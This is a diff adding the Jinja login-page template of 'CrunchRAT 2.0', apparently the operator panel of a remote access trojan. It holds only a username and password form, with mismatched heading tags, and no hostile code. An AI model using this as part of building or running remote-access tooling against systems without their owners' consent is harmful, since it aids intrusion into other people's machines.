@@ -1,0 +1,20 @@
+{% extends "base.html" %}
+
+{% block container %}
+    <div class="custom-login-form">
+        <h3>CrunchRAT 2.0</h2>
+        <h4>Written by @t3ntman</h3><br>
+        <form action="{{ url_for('login_submit') }}" method="post">
+            <!-- "Username" input -->
+            <div class="form-group">
+                <input type="text" class="form-control form-control-sm" name="username" placeholder="Username">
+            </div>
+            <!-- "Password" input -->
+            <div class="form-group">
+                <input type="password" class="form-control form-control-sm" name="password" placeholder="Password">
+            </div>
+            <!-- Submit button -->
+            <button type="submit" class="btn btn-default">Submit</button>
+        </form>
+    </div>
+{% endblock %}
